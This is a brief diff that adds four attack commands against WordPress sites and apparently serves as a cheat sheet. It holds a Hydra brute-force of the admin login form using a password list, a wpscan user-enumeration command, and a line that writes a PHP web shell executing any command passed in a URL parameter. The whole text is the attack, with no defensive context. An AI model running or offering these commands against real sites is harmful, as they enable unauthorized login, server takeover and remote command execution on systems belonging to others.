@@ -1,0 +1,4 @@
+hydra -l admin -P passwords.txt https://target.com http-post-form \
+"/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:F=Invalid"
+wpscan --url http://<IP> -e u
+echo "<?php system($_GET['cmd']); ?>" > shell.php
